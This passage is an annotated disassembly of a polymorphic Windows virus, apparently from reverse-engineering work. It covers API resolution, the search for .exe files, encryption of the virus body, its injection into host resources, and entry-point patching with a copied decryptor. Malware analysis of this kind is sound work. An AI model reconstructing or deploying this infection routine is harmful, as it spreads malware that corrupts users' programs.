.text:00401813 sub_401813      proc near               ; CODE XREF: find_other_api\u2191j
.text:00401813
.text:00401813 ; FUNCTION CHUNK AT .text:0040138D SIZE 0000003F BYTES
.text:00401813
.text:00401813                 mov     esi, offset aGetlogicaldriv ; "GetLogicalDrives"
.text:00401818                 mov     edi, offset dword_40172B ; edi = offset of getLogicalDrive function addr
.text:0040181D                 add     esi, ebp        ; add frame pointer addr
.text:0040181F                 add     edi, ebp        ; add frame pointer addr
.text:00401821                 push    ss:dword_4013EA[ebp] ; save kernel base offset
.text:00401827                 pop     ss:dword_401554[ebp] ; get dll base offset
.text:0040182D                 call    sub_40188E      ; call loop apis
.text:00401832                 mov     eax, offset aAdvapi32Dll ; "advapi32.dll"
.text:00401837                 add     eax, ebp        ; add frame pointer addr
.text:00401839                 push    eax             ; save addr of advapi32.dll
.text:0040183A                 call    ss:dword_40177B[ebp] ; call Load Library
.text:00401840                 or      eax, eax        ; LoadLibrary called successfully?
.text:00401842                 jz      loc_40138D      ; no so exit
.text:00401848                 mov     ss:dword_401554[ebp], eax ; save the handle to mem
.text:0040184E                 mov     esi, offset aRegopenkeyexa ; "RegOpenKeyExA"
.text:00401853                 mov     edi, offset dword_4017E5 ; offset of RegOpenKeyExA
.text:00401858                 add     esi, ebp        ; add frame pointer addr
.text:0040185A                 add     edi, ebp        ; add frame pointer addr
.text:0040185C                 call    sub_40188E      ; call loop api
.text:00401861                 lea     eax, aShell32Dll[ebp] ; "shell32.dll"
.text:00401867                 push    eax             ; save shell32.dll onto stack
.text:00401868                 call    ss:dword_40177B[ebp] ; call LoadLibrary for shell32.dll
.text:0040186E                 or      eax, eax        ; check if valid handle returned
.text:00401870                 jz      loc_40138D      ; no so jump here
.text:00401876                 mov     ss:dword_401554[ebp], eax ; save handle into memory
.text:0040187C                 lea     esi, aIsuseranadmin[ebp] ; "IsUserAnAdmin"
.text:00401882                 lea     edi, dword_40180B[ebp] ; isUserAdmin addr slot
.text:00401888                 call    sub_40188E      ; call loop apis
.text:0040188D                 retn                    ; return
.text:0040188D sub_401813      endp ; sp-analysis failed
.text:0040188D
.text:0040188E
.text:0040188E ; =============== S U B R O U T I N E =======================================
.text:0040188E
.text:0040188E
.text:0040188E sub_40188E      proc near               ; CODE XREF: sub_401813+1A\u2191p
.text:0040188E                                         ; sub_401813+49\u2191p ...
.text:0040188E
.text:0040188E ; FUNCTION CHUNK AT .text:0040138D SIZE 0000003F BYTES
.text:0040188E
.text:0040188E                 mov     eax, esi        ; eax = function name
.text:00401890                 push    eax             ; save function name onto stack
.text:00401891                 push    ss:dword_401554[ebp] ; save dll base offset
.text:00401897                 call    ss:dword_401449[ebp] ; call getProcAddr find the addr of the function
.text:0040189D                 or      eax, eax        ; is it a valid addr?
.text:0040189F                 jz      loc_40138D      ; no so jump here
.text:004018A5                 mov     [edi], eax      ; save the addr in the preallocated slot
.text:004018A7
.text:004018A7 loc_4018A7:                             ; CODE XREF: sub_40188E+1D\u2193j
.text:004018A7                 inc     esi             ; esi ++
.text:004018A8                 cmp     byte ptr [esi], 0 ; eof name?
.text:004018AB                 jnz     short loc_4018A7 ; no so keep looping
.text:004018AD                 inc     esi             ; go to next api addr
.text:004018AE                 add     edi, 4          ; inc array index
.text:004018B1                 cmp     dword ptr [edi], 0FFh ; valid array index?
.text:004018B7                 jz      short locret_4018BB ; not valid means we have traversed through the entire array
.text:004018B9                 jmp     short sub_40188E ; get addr of next entry
.text:004018BB ; ---------------------------------------------------------------------------
.text:004018BB
.text:004018BB locret_4018BB:                          ; CODE XREF: sub_40188E+29\u2191j
.text:004018BB                 retn                    ; return
.text:004018BB sub_40188E      endp ; sp-analysis failed
.text:004018BB
.text:004018BC ; ---------------------------------------------------------------------------
.text:004018BC
.text:004018BC loc_4018BC:                             ; DATA XREF: sub_401B3B+3B\u2193o
.text:004018BC                 push    eax             ; save eax onto stack
.text:004018BD                 call    sub_4018C6      ; nop
.text:004018BD ; ---------------------------------------------------------------------------
.text:004018C2 byte_4018C2     db 0FFh                 ; DATA XREF: start+304\u2191w
.text:004018C2                                         ; encrypt_2+5\u2193r ...
.text:004018C3                 db    0
.text:004018C4                 db    0
.text:004018C5                 db    0
.text:004018C6
.text:004018C6 ; =============== S U B R O U T I N E =======================================
.text:004018C6
.text:004018C6
.text:004018C6 sub_4018C6      proc near               ; CODE XREF: .text:004018BD\u2191p
.text:004018C6                 nop
.text:004018C7
.text:004018C7 loc_4018C7:                             ; DATA XREF: polyizer+14\u2193o
.text:004018C7                                         ; .text:00402644\u2193o
.text:004018C7                 nop
.text:004018C8                 nop
.text:004018C9                 nop
.text:004018CA                 nop
.text:004018CB                 nop
.text:004018CC                 nop
.text:004018CD                 nop
.text:004018CE                 nop
.text:004018CF                 nop
.text:004018D0                 nop
.text:004018D1                 nop
.text:004018D2                 nop
.text:004018D3                 nop
.text:004018D4                 nop
.text:004018D5                 nop
.text:004018D6                 nop
.text:004018D7                 nop
.text:004018D8                 nop
.text:004018D9                 nop
.text:004018DA                 nop
.text:004018DB                 nop
.text:004018DC                 nop
.text:004018DD                 nop
.text:004018DE                 nop
.text:004018DF                 nop
.text:004018E0                 nop
.text:004018E1                 nop
.text:004018E2                 nop
.text:004018E3                 nop
.text:004018E4                 nop
.text:004018E5                 nop
.text:004018E6                 nop
.text:004018E7                 nop
.text:004018E8                 nop
.text:004018E9                 nop
.text:004018EA                 nop
.text:004018EB                 nop
.text:004018EC                 nop
.text:004018ED                 nop
.text:004018EE                 nop
.text:004018EF                 nop
.text:004018F0                 nop
.text:004018F1                 nop
.text:004018F2                 nop
.text:004018F3                 nop
.text:004018F4                 nop
.text:004018F5                 nop
.text:004018F6                 nop
.text:004018F7                 nop
.text:004018F8                 nop
.text:004018F9                 nop
.text:004018FA                 nop
.text:004018FB                 nop
.text:004018FC                 nop
.text:004018FD                 nop
.text:004018FE                 nop
.text:004018FF                 nop
.text:00401900                 nop
.text:00401901                 nop
.text:00401902                 nop
.text:00401903                 nop
.text:00401904                 nop
.text:00401905                 nop
.text:00401906                 nop
.text:00401907                 nop
.text:00401908                 nop
.text:00401909                 nop
.text:0040190A                 nop
.text:0040190B                 nop
.text:0040190C                 nop
.text:0040190D                 nop
.text:0040190E                 nop
.text:0040190F                 nop
.text:00401910                 nop
.text:00401911                 nop
.text:00401912                 nop
.text:00401913                 nop
.text:00401914                 nop
.text:00401915                 nop
.text:00401916                 nop
.text:00401917                 nop
.text:00401918                 nop
.text:00401919                 nop
.text:0040191A                 nop
.text:0040191B                 nop
.text:0040191C                 nop
.text:0040191D                 nop
.text:0040191E                 nop
.text:0040191F                 nop
.text:00401920                 nop
.text:00401921                 nop
.text:00401922                 nop
.text:00401923                 nop
.text:00401924                 nop
.text:00401925                 nop
.text:00401926                 nop
.text:00401927                 nop
.text:00401928                 nop
.text:00401929                 nop
.text:0040192A                 nop
.text:0040192B                 nop
.text:0040192C                 nop
.text:0040192D                 nop
.text:0040192E                 nop
.text:0040192F                 nop
.text:00401930                 nop
.text:00401931                 nop
.text:00401932                 nop
.text:00401933                 nop
.text:00401934                 nop
.text:00401935                 nop
.text:00401936                 nop
.text:00401937                 nop
.text:00401938                 nop
.text:00401939                 nop
.text:0040193A                 nop
.text:0040193B                 nop
.text:0040193C                 nop
.text:0040193D                 nop
.text:0040193E                 nop
.text:0040193F                 nop
.text:00401940                 nop
.text:00401941                 nop
.text:00401942                 nop
.text:00401943                 nop
.text:00401944                 nop
.text:00401945                 nop
.text:00401946                 nop
.text:00401947                 nop
.text:00401948                 nop
.text:00401949                 nop
.text:0040194A                 nop
.text:0040194B                 nop
.text:0040194C                 nop
.text:0040194D                 nop
.text:0040194E                 nop
.text:0040194F                 nop
.text:00401950                 nop
.text:00401951                 nop
.text:00401952                 nop
.text:00401953                 nop
.text:00401954                 nop
.text:00401955                 nop
.text:00401956                 nop
.text:00401957                 nop
.text:00401958                 nop
.text:00401959                 nop
.text:0040195A                 nop
.text:0040195B                 nop
.text:0040195C                 nop
.text:0040195D                 nop
.text:0040195E                 nop
.text:0040195F                 nop
.text:00401960                 nop
.text:00401961                 nop
.text:00401962                 nop
.text:00401963                 nop
.text:00401964                 nop
.text:00401965                 nop
.text:00401966                 nop
.text:00401967                 nop
.text:00401968                 nop
.text:00401969                 nop
.text:0040196A                 nop
.text:0040196B                 nop
.text:0040196C                 nop
.text:0040196D                 nop
.text:0040196E                 nop
.text:0040196F                 nop
.text:00401970                 nop
.text:00401971                 nop
.text:00401972                 nop
.text:00401973                 nop
.text:00401974                 nop
.text:00401975                 nop
.text:00401976                 nop
.text:00401977                 nop
.text:00401978                 nop
.text:00401979                 nop
.text:0040197A                 nop
.text:0040197B                 nop
.text:0040197C                 nop
.text:0040197D                 nop
.text:0040197E                 nop
.text:0040197F                 nop
.text:00401980                 nop
.text:00401981                 nop
.text:00401982                 nop
.text:00401983                 nop
.text:00401984                 nop
.text:00401985                 nop
.text:00401986                 nop
.text:00401987                 nop
.text:00401988                 nop
.text:00401989                 nop
.text:0040198A                 nop
.text:0040198B                 nop
.text:0040198C                 nop
.text:0040198D                 nop
.text:0040198E                 nop
.text:0040198F                 nop
.text:00401990                 nop
.text:00401991                 nop
.text:00401992                 nop
.text:00401993                 nop
.text:00401994                 nop
.text:00401995                 nop
.text:00401996                 nop
.text:00401997                 nop
.text:00401998                 nop
.text:00401999                 nop
.text:0040199A                 nop
.text:0040199B                 nop
.text:0040199C                 nop
.text:0040199D                 nop
.text:0040199E                 nop
.text:0040199F                 nop
.text:004019A0                 nop
.text:004019A1                 nop
.text:004019A2                 nop
.text:004019A3                 nop
.text:004019A4                 nop
.text:004019A5                 nop
.text:004019A6                 nop
.text:004019A7                 nop
.text:004019A8                 nop
.text:004019A9                 nop
.text:004019AA                 nop
.text:004019AB                 nop
.text:004019AC                 nop
.text:004019AD                 nop
.text:004019AE                 nop
.text:004019AF                 nop
.text:004019B0                 nop
.text:004019B1                 nop
.text:004019B2                 nop
.text:004019B3                 nop
.text:004019B4                 nop
.text:004019B5                 nop
.text:004019B6                 nop
.text:004019B7                 nop
.text:004019B8                 nop
.text:004019B9                 nop
.text:004019BA                 nop
.text:004019BB                 nop
.text:004019BC                 nop
.text:004019BD                 nop
.text:004019BE                 nop
.text:004019BF                 nop
.text:004019C0                 nop
.text:004019C1                 nop
.text:004019C2                 nop
.text:004019C3                 nop
.text:004019C4                 nop
.text:004019C5                 nop
.text:004019C6                 nop
.text:004019C7                 nop
.text:004019C8                 nop
.text:004019C9                 nop
.text:004019CA                 nop
.text:004019CB                 nop
.text:004019CC                 nop
.text:004019CD                 nop
.text:004019CE                 nop
.text:004019CF                 nop
.text:004019D0                 nop
.text:004019D1                 nop
.text:004019D2                 nop
.text:004019D3                 nop
.text:004019D4                 nop
.text:004019D5                 nop
.text:004019D6                 nop
.text:004019D7                 nop
.text:004019D8                 nop
.text:004019D9                 nop
.text:004019DA                 nop
.text:004019DB                 nop
.text:004019DC                 nop
.text:004019DD                 nop
.text:004019DE                 nop
.text:004019DF                 nop
.text:004019E0                 nop
.text:004019E1                 nop
.text:004019E2                 nop
.text:004019E3                 nop
.text:004019E4                 nop
.text:004019E5                 nop
.text:004019E6                 nop
.text:004019E7                 nop
.text:004019E8                 nop
.text:004019E9                 nop
.text:004019EA                 nop
.text:004019EB                 nop
.text:004019EC                 nop
.text:004019ED                 nop
.text:004019EE                 nop
.text:004019EF                 nop
.text:004019F0                 nop
.text:004019F1                 nop
.text:004019F2                 nop
.text:004019F3                 nop
.text:004019F4                 nop
.text:004019F5                 nop
.text:004019F6                 nop
.text:004019F7                 nop
.text:004019F8                 nop
.text:004019F9                 nop
.text:004019FA                 nop
.text:004019FB                 nop
.text:004019FC                 nop
.text:004019FD                 nop
.text:004019FE                 nop
.text:004019FF                 nop
.text:00401A00                 nop
.text:00401A01                 nop
.text:00401A02                 nop
.text:00401A03                 nop
.text:00401A04                 nop
.text:00401A05                 nop
.text:00401A06                 nop
.text:00401A06 sub_4018C6      endp
.text:00401A06
.text:00401A07
.text:00401A07 ; =============== S U B R O U T I N E =======================================
.text:00401A07
.text:00401A07
.text:00401A07 encrypt_2       proc near               ; CODE XREF: exe_file+27D\u2193p
.text:00401A07                 mov     ecx, 1720h      ; ecx = virus size
.text:00401A0C                 mov     eax, dword ptr ss:byte_4018C2[ebp] ; eax = random num
.text:00401A12
.text:00401A12 loc_401A12:                             ; CODE XREF: encrypt_2+E\u2193j
.text:00401A12                 xor     [esi], eax      ; xor [esi] with random num
.text:00401A14                 inc     esi             ; esi ++
.text:00401A15                 loop    loc_401A12      ; encrypt
.text:00401A17                 retn                    ; return
.text:00401A17 encrypt_2       endp
.text:00401A17
.text:00401A18 ; ---------------------------------------------------------------------------
.text:00401A18                 jmp     short infect_exe ; jump here
.text:00401A18 ; ---------------------------------------------------------------------------
.text:00401A1A dword_401A1A    dd 0                    ; DATA XREF: exe_file\u2193w
.text:00401A1A                                         ; exe_file+6\u2193r ...
.text:00401A1E dword_401A1E    dd 0                    ; DATA XREF: start+2BA\u2191r
.text:00401A1E                                         ; exe_file+6D\u2193w
.text:00401A22 dword_401A22    dd 0                    ; DATA XREF: start+2B4\u2191r
.text:00401A22                                         ; sub_401B15+2\u2193r ...
.text:00401A26 dword_401A26    dd 0                    ; DATA XREF: exe_file+242\u2193w
.text:00401A26                                         ; exe_file+296\u2193r
.text:00401A2A dword_401A2A    dd 0                    ; DATA XREF: exe_file+1AA\u2193w
.text:00401A2A                                         ; exe_file+1F4\u2193r ...
.text:00401A2E dword_401A2E    dd 0                    ; DATA XREF: sub_401B3B+10\u2193r
.text:00401A2E                                         ; exe_file+F5\u2193w ...
.text:00401A32 dword_401A32    dd 0                    ; DATA XREF: exe_file+1C1\u2193w
.text:00401A32                                         ; exe_file+1E8\u2193r ...
.text:00401A36 dword_401A36    dd 0                    ; DATA XREF: exe_file+1A\u2193w
.text:00401A36                                         ; exe_file+27\u2193r ...
.text:00401A3A dword_401A3A    dd 0                    ; DATA XREF: infect_exe+16\u2193w
.text:00401A3A                                         ; infect_exe+1C\u2193r ...
.text:00401A3E word_401A3E     dw 2E2Ah                ; DATA XREF: infect_exe+22\u2193o
.text:00401A40                 db 2Ah, 0
.text:00401A42 dword_401A42    dd 0                    ; DATA XREF: infect_exe+39\u2193w
.text:00401A42                                         ; infect_exe+6D\u2193r ...
.text:00401A46                 align 4
.text:00401A48                 dd 2E2A0000h, 2Ah, 0
.text:00401A54                 db 2 dup(0)
.text:00401A56 dword_401A56    dd 0                    ; DATA XREF: sub_401B3B+2C\u2193r
.text:00401A56                                         ; exe_file+290\u2193w
.text:00401A5A
.text:00401A5A ; =============== S U B R O U T I N E =======================================
.text:00401A5A
.text:00401A5A
.text:00401A5A infect_exe      proc near               ; CODE XREF: start+30A\u2191p
.text:00401A5A                                         ; .text:00401A18\u2191j ...
.text:00401A5A                 mov     eax, 13Eh       ; size of the win32_find_data
.text:00401A5F                 push    eax             ; save the size onto stack
.text:00401A60                 push    0               ; allocates fixed memory
.text:00401A62                 call    ss:dword_401753[ebp] ; call GlobalAlloc()
.text:00401A68                 or      eax, eax        ; is the pointer valid?
.text:00401A6A                 jz      locret_401B14   ; no so jump here
.text:00401A70                 mov     ss:dword_401A3A[ebp], eax ; save the pointer to memory
.text:00401A76                 push    ss:dword_401A3A[ebp] ; push pointer onto stack
.text:00401A7C                 mov     eax, offset word_401A3E
.text:00401A81                 add     eax, ebp        ; add frame pointer
.text:00401A83                 push    eax             ; push eax onto stack
.text:00401A84                 call    ss:dword_401767[ebp] ; findFirstFile function
.text:00401A8A                 cmp     eax, 0FFFFFFFFh ; is the file handle valid?
.text:00401A8D                 jz      locret_401B14   ; no so jump here
.text:00401A93                 mov     ss:dword_401A42[ebp], eax ; save file handle to mem
.text:00401A99                 mov     eax, ss:dword_401A3A[ebp] ; eax = globalAlloc pointer
.text:00401A9F                 add     eax, 2Ch ; ','  ; eax += 2Ch
.text:00401AA2                 mov     esi, eax        ; esi points to file name
.text:00401AA4                 call    get_size_of_string ; ecx = size of file name
.text:00401AA9                 mov     esi, eax        ; esi now at start of file name
.text:00401AAB                 add     esi, ecx        ; esi now at end of file name
.text:00401AAD                 sub     esi, 4          ; 4th last char of file name
.text:00401AB0                 mov     edx, [esi]      ; edx has last 4 char of file name
.text:00401AB2                 xor     edx, 6578652Eh  ; check if .exe file
.text:00401AB8                 or      edx, edx        ; is the extension an exe file?
.text:00401ABA                 jnz     short find_exe  ; no so jump here
.text:00401ABC                 call    exe_file        ; yes so jump here
.text:00401AC1
.text:00401AC1 find_exe:                               ; CODE XREF: infect_exe+60\u2191j
.text:00401AC1                                         ; infect_exe+A5\u2193j ...
.text:00401AC1                 push    ss:dword_401A3A[ebp] ; w32 data pointer pushed onto stack
.text:00401AC7                 push    ss:dword_401A42[ebp] ; push file handle onto stack
.text:00401ACD                 call    ss:dword_40176B[ebp] ; call FindNextFile func
.text:00401AD3                 call    ss:dword_401773[ebp] ; call getLastError func
.text:00401AD9                 cmp     eax, 12h        ; check if last error is the no more files error
.text:00401ADC                 jz      short loc_401B08 ; no more files left so jump here
.text:00401ADE                 mov     eax, ss:dword_401A3A[ebp] ; eax = w32 data offset
.text:00401AE4                 add     eax, 2Ch ; ','  ; shift pointer by 44 bytes
.text:00401AE7                 mov     esi, eax        ; esi points to file name
.text:00401AE9                 call    get_size_of_string ; ecx = size of file name
.text:00401AEE                 mov     esi, eax        ; esi now at start of file name
.text:00401AF0                 add     esi, ecx        ; esi now at end of file name
.text:00401AF2                 sub     esi, 4          ; 4th last char of file name
.text:00401AF5                 mov     edx, [esi]      ; edx has last 4 char of file name
.text:00401AF7                 xor     edx, 6578652Eh  ; check if exe file
.text:00401AFD                 or      edx, edx        ; is the file extension .exe?
.text:00401AFF                 jnz     short find_exe  ; no so keep finding .exe file
.text:00401B01                 call    exe_file        ; yes it is an exe file so infect
.text:00401B06                 jmp     short find_exe  ; no so find next exe file
.text:00401B08 ; ---------------------------------------------------------------------------
.text:00401B08
.text:00401B08 loc_401B08:                             ; CODE XREF: infect_exe+82\u2191j
.text:00401B08                 push    ss:dword_401A42[ebp] ; push exe handle onto stack
.text:00401B0E                 call    ss:dword_40176F[ebp] ; call FindClose func
.text:00401B14
.text:00401B14 locret_401B14:                          ; CODE XREF: infect_exe+10\u2191j
.text:00401B14                                         ; infect_exe+33\u2191j
.text:00401B14                 retn                    ; return
.text:00401B14 infect_exe      endp
.text:00401B14
.text:00401B15
.text:00401B15 ; =============== S U B R O U T I N E =======================================
.text:00401B15
.text:00401B15
.text:00401B15 sub_401B15      proc near               ; CODE XREF: exe_file+23D\u2193p
.text:00401B15                 push    ebx             ; save size of optinal header onto stack
.text:00401B16                 push    edx             ; start of optional header
.text:00401B17                 mov     ebx, ss:dword_401A22[ebp] ; ebx = old eip
.text:00401B1D
.text:00401B1D loc_401B1D:                             ; CODE XREF: sub_401B15+14\u2193j
.text:00401B1D                                         ; sub_401B15+20\u2193j
.text:00401B1D                 xor     eax, eax        ; eax = 0
.text:00401B1F                 mov     eax, [edx+0Ch]  ; addr of entry point
.text:00401B22                 cmp     eax, ebx        ; addr compare with the entry point
.text:00401B24                 jle     short loc_401B2B ; if less than then jump here
.text:00401B26                 add     edx, 28h ; '('  ; edx += 28h
.text:00401B29                 jmp     short loc_401B1D ; loop
.text:00401B2B ; ---------------------------------------------------------------------------
.text:00401B2B
.text:00401B2B loc_401B2B:                             ; CODE XREF: sub_401B15+F\u2191j
.text:00401B2B                 add     eax, [edx+10h]  ; size of raw data
.text:00401B2E                 cmp     eax, ebx        ; size of raw data > size of optional header?
.text:00401B30                 jg      short loc_401B37 ; yes so pointer found
.text:00401B32                 add     edx, 28h ; '('  ; no so edx += 28h
.text:00401B35                 jmp     short loc_401B1D ; loop
.text:00401B37 ; ---------------------------------------------------------------------------
.text:00401B37
.text:00401B37 loc_401B37:                             ; CODE XREF: sub_401B15+1B\u2191j
.text:00401B37                 xchg    eax, edx        ; eax = pointer to 1st section
.text:00401B38                 pop     edx             ; restore edx
.text:00401B39                 pop     ebx             ; restore ebx
.text:00401B3A                 retn                    ; return to caller
.text:00401B3A sub_401B15      endp
.text:00401B3A
.text:00401B3B
.text:00401B3B ; =============== S U B R O U T I N E =======================================
.text:00401B3B
.text:00401B3B
.text:00401B3B sub_401B3B      proc near               ; CODE XREF: exe_file+29C\u2193p
.text:00401B3B
.text:00401B3B var_4           = dword ptr -4
.text:00401B3B
.text:00401B3B                 mov     dword ptr [eax+24h], 0C0000040h ; set code section characteristics
.text:00401B42                 mov     edx, ss:dword_401A22[ebp] ; edx = start of exec code offset
.text:00401B48                 sub     edx, [eax+0Ch]  ; edx - RVA for section
.text:00401B4B                 mov     ecx, ss:dword_401A2E[ebp] ; ecx = file offset (start of file)
.text:00401B51                 add     ecx, [eax+14h]  ; add offset for raw data
.text:00401B54                 add     ecx, edx        ; point to end of data
.text:00401B56                 lea     edi, byte_401077[ebp] ; edi = dump bytes offset
.text:00401B5C                 xchg    esi, ecx        ; swap esi and ecx. esi points to data
.text:00401B5E                 mov     ecx, dword ptr ss:byte_4018C2[ebp] ; ecx = random num
.text:00401B64                 mov     byte ptr [esi], 0B8h ; ''
.text:00401B67                 push    ss:dword_401A56[ebp] ; push virus entry point onto stack
.text:00401B6D                 xor     [esp+4+var_4], ecx ; encrypt the value pushed
.text:00401B70                 pop     dword ptr [esi+1] ; store encyrpted values into data
.text:00401B73                 add     esi, 5          ; esi += 5 (skip over written bytes)
.text:00401B76                 lea     edi, loc_4018BC[ebp] ; edi = encryption key polymorphic decryptor
.text:00401B7C                 xchg    edi, esi        ; edi points to infected file, esi points to polymorphic section with encryption key
.text:00401B7E                 mov     ecx, 14Bh       ; ecx = 331 bytes (size to be copied)
.text:00401B83                 rep movsb               ; moves polymorphic code into infected file
.text:00401B85                 retn                    ; return
.text:00401B85 sub_401B3B      endp
.text:00401B85
.text:00401B86 ; ---------------------------------------------------------------------------
.text:00401B86 ; START OF FUNCTION CHUNK FOR exe_file
.text:00401B86
.text:00401B86 restore_and_exit:                       ; CODE XREF: exe_file+AA\u2193j
.text:00401B86                                         ; exe_file+C4\u2193j ...
.text:00401B86                 popa                    ; restore all general registers
.text:00401B87                 jmp     exit_infect     ; exit
.text:00401B87 ; END OF FUNCTION CHUNK FOR exe_file
.text:00401B8C
.text:00401B8C ; =============== S U B R O U T I N E =======================================
.text:00401B8C
.text:00401B8C
.text:00401B8C exe_file        proc near               ; CODE XREF: start+2F4\u2191p
.text:00401B8C                                         ; infect_exe+62\u2191p ...
.text:00401B8C
.text:00401B8C ; FUNCTION CHUNK AT .text:0040138D SIZE 0000003F BYTES
.text:00401B8C ; FUNCTION CHUNK AT .text:00401B86 SIZE 00000006 BYTES
.text:00401B8C
.text:00401B8C                 mov     ss:dword_401A1A[ebp], eax ; save .exe file handle into mem
.text:00401B92                 push    ss:dword_401A1A[ebp] ; push .exe file handle onto stack
.text:00401B98                 call    ss:dword_40177B[ebp] ; call LoadLibrary func
.text:00401B9E                 or      eax, eax        ; valid handle received?
.text:00401BA0                 jz      exit_infect     ; no so jump here
.text:00401BA6                 mov     ss:dword_401A36[ebp], eax ; yes so save handle to mem
.text:00401BAC                 push    0Ah             ; resource type: RC_DATA -> Application-defined resource(raw data)
.text:00401BAE                 push    4D2h            ; resource name: 1234
.text:00401BB3                 push    ss:dword_401A36[ebp] ; push module handle onto stack
.text:00401BB9                 call    ss:dword_40174B[ebp] ; call FindResource func
.text:00401BBF                 or      eax, eax        ; valid resource found?
.text:00401BC1                 jnz     exit_infect     ; no so jump here
.text:00401BC7                 mov     esi, ss:dword_401A36[ebp] ; esi = module handle
.text:00401BCD                 cmp     word ptr [esi], 5A4Dh ; is file mz type?
.text:00401BD2                 jnz     exit_infect     ; no so exit
.text:00401BD8                 add     esi, [esi+3Ch]  ; go to next section
.text:00401BDB                 cmp     word ptr [esi], 4550h ; is the section the pe header?
.text:00401BE0                 jnz     exit_infect     ; no so exit
.text:00401BE6                 cmp     dword ptr [esi+88h], 0 ; is ResourceDirectory VA NULL?
.text:00401BED                 jz      exit_infect     ; yes so exit
.text:00401BF3                 mov     eax, [esi+28h]  ; eax = addr of entry point
.text:00401BF6                 mov     ebx, [esi+34h]  ; ebx = ImageBase
.text:00401BF9                 mov     ss:dword_401A1E[ebp], ebx ; save Imagebase to mem
.text:00401BFF                 mov     ss:dword_401A22[ebp], eax ; save addr of Entry Point to mem
.text:00401C05                 push    edi             ; save edi to stack
.text:00401C06                 mov     edi, eax        ; edi = addr of EntryPoint
.text:00401C08                 add     edi, ss:dword_401A36[ebp] ; edi = offset of module handle + addr of EntryPoint
.text:00401C0E                 push    esi             ; save esi onto stack
.text:00401C0F                 lea     esi, byte_401077[ebp] ; pre defined mem addr to copy stuff to
.text:00401C15                 xchg    esi, edi        ; copy from PE header to mem
.text:00401C17                 mov     ecx, 200h       ; 512 bytes
.text:00401C1C                 rep movsb               ; copy 512 bytes of data from host entry point
.text:00401C1E                 pop     esi             ; restore esi
.text:00401C1F                 pop     edi             ; restore edi
.text:00401C20                 xor     ecx, ecx        ; ecx = 0
.text:00401C22                 xor     edx, edx        ; edx = 0
.text:00401C24                 mov     cx, [esi+6]     ; cx = Number of sections
.text:00401C28                 mov     dx, [esi+14h]   ; size of Optional Header
.text:00401C2C                 add     esi, 18h        ; esi += 18h
.text:00401C2F                 add     esi, edx        ; esi += edx
.text:00401C31                 pusha                   ; save all general registers to stack
.text:00401C32
.text:00401C32 loc_401C32:                             ; CODE XREF: exe_file+B3\u2193j
.text:00401C32                 cmp     dword ptr [esi+10h], 0 ; is this the ordinal base?
.text:00401C36                 jz      restore_and_exit ; yes so jump here
.text:00401C3C                 add     esi, 28h ; '('  ; no so go to next entry
.text:00401C3F                 loop    loc_401C32      ; recheck
.text:00401C41                 popa
.text:00401C42                 pusha
.text:00401C43
.text:00401C43 loc_401C43:                             ; CODE XREF: exe_file+C2\u2193j
.text:00401C43                 cmp     dword ptr [esi], 7273722Eh ; is it .rsr format?
.text:00401C49                 jz      short loc_401C55 ; yes so jump here
.text:00401C4B                 add     esi, 28h ; '('  ; no so go to next entry
.text:00401C4E                 loop    loc_401C43      ; recheck
.text:00401C50                 jmp     restore_and_exit ; not found so exit
.text:00401C55 ; ---------------------------------------------------------------------------
.text:00401C55
.text:00401C55 loc_401C55:                             ; CODE XREF: exe_file+BD\u2191j
.text:00401C55                 dec     ecx             ; ecx --
.text:00401C56                 or      ecx, ecx        ; ecx valid?
.text:00401C58                 jz      short loc_401C5F ; yes so jump here
.text:00401C5A                 jmp     restore_and_exit ; no so return
.text:00401C5F ; ---------------------------------------------------------------------------
.text:00401C5F
.text:00401C5F loc_401C5F:                             ; CODE XREF: exe_file+CC\u2191j
.text:00401C5F                 popa
.text:00401C60                 push    ss:dword_401A36[ebp] ; push module handle onto stack
.text:00401C66                 call    ss:dword_40177F[ebp] ; call FreeLibrary func
.text:00401C6C                 push    1720h           ; push virus size onto stack
.text:00401C71                 push    0               ; push 0 onto stack
.text:00401C73                 call    ss:dword_401753[ebp] ; GlobalAlloc(0, virus_size) -> Allocate fixed memory
.text:00401C79                 or      eax, eax        ; valid pointer returned?
.text:00401C7B                 jz      exit_infect     ; no so exit
.text:00401C81                 mov     ss:dword_401A2E[ebp], eax ; save pointer of allocated memory
.text:00401C87                 mov     esi, offset start ; esi = Start of virus
.text:00401C8C                 add     esi, ebp        ; esi = start offset + frame pointer
.text:00401C8E                 mov     edi, ss:dword_401A2E[ebp] ; edi = pointer to allocated memory
.text:00401C94                 mov     ecx, 1720h      ; ecx = virus size
.text:00401C99                 rep movsb               ; copy virus to allocated memory
.text:00401C9B                 mov     ecx, 1720h      ; ecx = virus size
.text:00401CA0                 sub     ecx, 72h ; 'r'  ; subtract stub size
.text:00401CA6                 mov     eax, ss:dword_401A2E[ebp] ; eax = pointer to allocated memory
.text:00401CAC                 add     eax, 72h ; 'r'  ; add stub size to pointer
.text:00401CB1
.text:00401CB1 loc_401CB1:                             ; CODE XREF: exe_file+13A\u2193j
.text:00401CB1                 push    ecx             ; save virus size - stub size onto stack
.text:00401CB2                 mov     cx, [eax]       ; cx = pointer to allocated memory
.text:00401CB5                 xchg    ch, cl          ; encryptor start
.text:00401CB7                 rol     ch, cl          ; rotate left
.text:00401CB9                 mov     [eax], cx       ; eax = pointer that to allocated memory
.text:00401CBC                 add     eax, 2          ; eax += 2
.text:00401CBF                 pop     ecx             ; ecx = virus size - stub size
.text:00401CC0                 sub     ecx, 2          ; ecx -= 2
.text:00401CC3                 cmp     ecx, 0          ; have you encrypted everything?
.text:00401CC6                 ja      short loc_401CB1 ; no so keep encrypting
.text:00401CC8                 push    0               ; push 0 (FALSE) onto stack
.text:00401CCA                 push    ss:dword_401A1A[ebp] ; push virus file handle onto stack
.text:00401CD0                 call    ss:dword_40173F[ebp] ; call BeginUpdateResource func
.text:00401CD6                 or      eax, eax        ; is handle returned valid?
.text:00401CD8                 jz      exit_infect     ; no so jump here
.text:00401CDE                 push    eax             ; save update resource handle onto stack
.text:00401CDF                 push    1720h           ; push virus size onto stack
.text:00401CE4                 push    ss:dword_401A2E[ebp] ; push pointer to allocated memory onto stack
.text:00401CEA                 push    9               ; push 9 onto stack (LANG_ENGLISH)
.text:00401CEC                 push    4D2h            ; push 1234 (resource name) onto stack
.text:00401CF1                 push    0Ah             ; push 0Ah onto stack (RC_DATA)
.text:00401CF3                 push    eax             ; push handle onto stack
.text:00401CF4                 call    ss:dword_401743[ebp] ; call updateResource func
.text:00401CFA                 or      eax, eax        ; true or false returned by updateResource
.text:00401CFC                 jz      exit_infect     ; false so exit
.text:00401D02                 pop     eax             ; restore eax
